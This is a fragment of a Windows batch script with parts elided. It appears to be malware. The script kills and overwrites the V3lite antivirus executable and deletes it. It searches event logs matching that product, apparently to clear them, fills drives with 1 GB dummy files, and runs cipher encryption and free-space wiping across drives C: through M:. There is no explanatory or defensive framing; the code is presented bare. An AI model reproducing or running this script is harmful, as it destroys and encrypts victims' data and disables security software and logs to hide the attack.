...
echo @echo off
echo :loop
echo tasklist /fi "imagename eq cmd.exe" /v ^| find /i "n56.bat" ^>nul
...
for /f "delims=" %%i in ('dir /s /b c:\V3lite.exe 2^>nul') do (
    taskkill /f /im "V3lite.exe" >nul 2>&1
    fsutil file setzerodata offset=0 length=999999999 "%%i" >nul 2>&1
    del /f /q "%%i" >nul 2>&1
    wevtutil el | findstr /i "V3" >nul && (
        for /f "delims=" %%j in ('wevtutil el ^| findstr /i "V3"') do (
...
fsutil file createnew C:\dummy_1gb.dat 1073741824
fsutil file createnew
C:\dummy_1gb.dat 1073741824
fsutil file createnew
C:\dummy_1gb.dat 1073741824
fsutil file createnew
C:\dummy_1gb.dat 1073741824
...
C:\dummy_1gb.dat 1073741824
fsutil file createnew
D:\dummy_1gb.dat 1073741824
fsutil file createnew
E:\dummy_1gb.dat 1073741824
...
cipher /w:D:\ >nul 2>&1
cipher /e /s:E:\ >nul 2>&1 
cipher /e /s:F:\ >nul 2>&1
cipher /w:E:\ >nul 2>&1
cipher /e /s:G:\ >nul 2>&1
cipher /w:F:\ >nul 2>&1
cipher /e /s:C:\ >nul 2>&1 
cipher /w:C:\ >nul 2>&1
cipher /e /s:D:\ >nul 2>&1
cipher /w:D:\ >nul 2>&1
cipher /e /s:E:\ >nul 2>&1 
cipher /e /s:H:\ >nul 2>&1
cipher /w:H:\ >nul 2>&1
cipher /e /s:I:\ >nul 2>&1
cipher /e /s:J:\ >nul 2>&1
cipher /w:J:\ >nul 2>&1
cipher /e /s:K:\ >nul 2>&1
cipher /w:I:\ >nul 2>&1
cipher /e /s:M:\ >nul 2>&1 
cipher /e /s:L:\ >nul 2>&1
